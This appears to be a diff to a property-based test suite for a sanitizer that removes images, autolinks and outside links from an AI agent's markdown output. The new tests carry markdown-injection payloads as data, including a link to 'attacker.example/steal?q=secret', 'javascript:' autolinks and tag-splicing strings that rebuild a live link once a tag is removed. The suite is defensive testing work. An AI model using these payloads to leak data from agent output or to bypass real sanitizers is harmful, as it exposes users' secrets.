@@ -8,7 +8,7 @@ or outside link may be left in what comes out.
 import re
 
 import pytest
-from hypothesis import given, settings
+from hypothesis import example, given, settings
 from hypothesis import strategies as st
 
 from geekbot.agent import sanitize as module
@@ -161,10 +161,91 @@ def test_a_bare_reference_image_is_made_literal_not_removed() -> None:
 
 
 def test_cleaning_that_brings_two_pieces_together_cannot_make_a_new_opener() -> None:
-    assert clean(f"!<img src=x>[a]({EVIL})") == "!a"  # the link became "a": no "[" next to the "!"
+    # The image tag went and the link became "a": "!" and what followed touched across the hole, so
+    # one space separates them (S5.2: before "!a"; either way no "[" is next to the "!").
+    assert clean(f"!<img src=x>[a]({EVIL})") == "! a"
     assert clean("!<img src=x>[a](notes.md)") == "! [a](notes.md)"  # "![a](...)" would be an image
     assert clean("<<img x>img src=a>") == "< img src=a>"  # "<" and "img" would have made a tag
     assert clean(f"[wow!]({EVIL})[x](notes.md)") == "wow! [x](notes.md)"
+
+
+@pytest.mark.parametrize(
+    "attack",
+    [
+        f"[click]<img src=a>({EVIL})",
+        f"![x]<img src=a>({EVIL})",
+        f"![x]<script></script>({EVIL})",
+        "<IMGjavascript:<img >>",
+        "<javascript:<img >alert(1)>",
+        f"[x]:<img src=a>{EVIL}",
+        f"[x]: <img src=a>{EVIL}",
+        f"[x]:\n<img src=a>\n{EVIL}",
+        f"[a]<img src=a>[b]<img src=a>({EVIL})",
+    ],
+)
+def test_a_removal_cannot_join_two_halves_into_a_link_an_autolink_or_a_definition(
+    attack: str,
+) -> None:
+    """Found in S5.2 by hypothesis (``<IMGjavascript:<img >>``) and by hand: the halves of a construct
+    were scanned apart, and removing what lay between them completed it, for example
+    ``[click]<img src=a>(https://attacker.example/...)`` came out as a live link to the outside."""
+    out = sanitize_text(attack, ALLOWED).text
+    assert "![" not in out
+    for autolink in re.findall(r"<([A-Za-z][A-Za-z0-9+.\-]*:[^\s>]*)>", out):
+        assert autolink in ALLOWED, out
+    for address in _links(out):
+        assert not module._is_outside(address) or address in ALLOWED, out
+    for line in out.split("\n"):
+        definition = re.match(r" {0,3}\[(?=[^\[\]]*[^\s\[\]])[^\[\]]*\]:\s*<?(\S+)", line)
+        if definition:
+            assert not module._is_outside(definition[1]) or definition[1] in ALLOWED, out
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "[<http://e.x>]:",
+        "[<http://e.x>]: notes.md",
+        "[<http://e.x>]: ok.md\n",
+        "[![x](http://e.x/p)]:",
+        "[<javascript:alert(1)>]: #top",
+    ],
+)
+def test_the_label_of_a_definition_that_stays_is_cleaned_too(text: str) -> None:
+    """Found in S5.2 by hypothesis: a definition with a safe or empty address kept its raw line, so an
+    autolink or an image inside its label was drawn."""
+    out = sanitize_text(text, ALLOWED).text
+    assert "![" not in out
+    assert not re.findall(r"<([A-Za-z][A-Za-z0-9+.\-]*:[^\s>]*)>", out)
+
+
+@pytest.mark.parametrize(
+    ("text", "expected"),
+    [
+        ("see ![x](u) here", "see  here"),  # a removal between two spaces needs nothing
+        (
+            f"Read [the docs]({EVIL}).",
+            "Read the docs.",
+        ),  # a link reduced to its text keeps its full stop
+        (f"a ![x]({EVIL}) b", "a  b"),
+        ("tail ![x](u)", "tail "),  # nothing follows the hole
+    ],
+)
+def test_ordinary_prose_around_a_removal_is_left_as_it_was(text: str, expected: str) -> None:
+    assert clean(text) == expected
+
+
+def test_a_blank_line_is_added_only_where_two_sides_of_a_removal_touch() -> None:
+    assert clean("logo![x](u).") == "logo\n\n."  # the full stop touched the word across the hole
+    assert clean("one ![x](u)two") == "one two"  # a space already separates the hole from "one"
+
+
+def test_a_removal_that_ends_one_piece_of_a_stream_still_separates_the_next() -> None:
+    cleaner = StreamSanitizer(ALLOWED)
+    pieces = ["[click]<img src=a>", f"({EVIL})"]
+    out = "".join(cleaner.feed(p) for p in pieces) + cleaner.finish()
+    assert out == sanitize_text("".join(pieces), ALLOWED).text
+    assert not _links(out)
 
 
 def test_a_backslash_makes_the_next_bracket_literal_and_two_do_not() -> None:
@@ -303,6 +384,10 @@ def _links(text: str) -> list[str]:
 
 @settings(max_examples=600, deadline=None)
 @given(st.lists(st.sampled_from([p for p in PIECES if p != "\\"]), max_size=40).map("".join))
+@example(
+    "<IMGjavascript:<img >>"
+)  # found by hypothesis in S5.2's full run: a removal made an autolink
+@example("[click]<img src=a>(https://attacker.example/steal?q=secret)")  # the same hole, as a link
 def test_nothing_that_loads_or_leads_outside_survives(text: str) -> None:
     out = sanitize_text(text, ALLOWED).text
     assert "![" not in out
@@ -315,7 +400,7 @@ def test_nothing_that_loads_or_leads_outside_survives(text: str) -> None:
     for address in _links(out):
         assert not module._is_outside(address) or address in ALLOWED
     for line in out.split("\n"):
-        definition = re.match(r" {0,3}\[[^\[\]]*\]:\s*<?(\S+)", line)
+        definition = re.match(r" {0,3}\[(?=[^\[\]]*[^\s\[\]])[^\[\]]*\]:\s*<?(\S+)", line)
         if definition:
             address = definition[1]
             assert not module._is_outside(address) or address in ALLOWED
